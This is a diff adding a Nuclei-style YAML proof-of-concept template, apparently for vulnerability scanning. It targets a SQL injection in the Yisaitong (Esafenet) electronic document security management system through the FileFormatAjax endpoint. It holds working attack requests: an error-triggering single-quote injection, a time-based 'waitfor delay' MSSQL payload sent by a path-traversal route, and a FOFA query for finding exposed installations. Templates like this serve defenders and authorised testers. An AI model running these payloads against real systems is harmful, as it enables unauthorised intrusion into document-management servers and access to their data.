@@ -1,0 +1,63 @@
+id: poc-yaml-yisaitong-esafenet-fileformatajax-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 FileFormatAjax SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 亿赛通电子文档安全管理系统
+    fofa: app="亿赛通-电子文档安全管理系统"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-sqli-error
+    method: POST
+    path:
+      - "{{BaseURL}}/CDGServer3/js/../FileFormatAjax"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "command=delFileFormat&fileFormatId='"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "CDGServer3"
+      - type: word
+        part: body
+        words:
+          - "删除出错！"
+      - type: status
+        status:
+          - 200
+
+  - id: check-sqli-time-delay
+    method: POST
+    path:
+      - "{{BaseURL}}/CDGServer3/js/../FileFormatAjax"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "command=delFileFormat&fileFormatId=-1'waitfor delay '0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "CDGServer3"
+      - type: word
+        part: body
+        words:
+          - "OK"
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
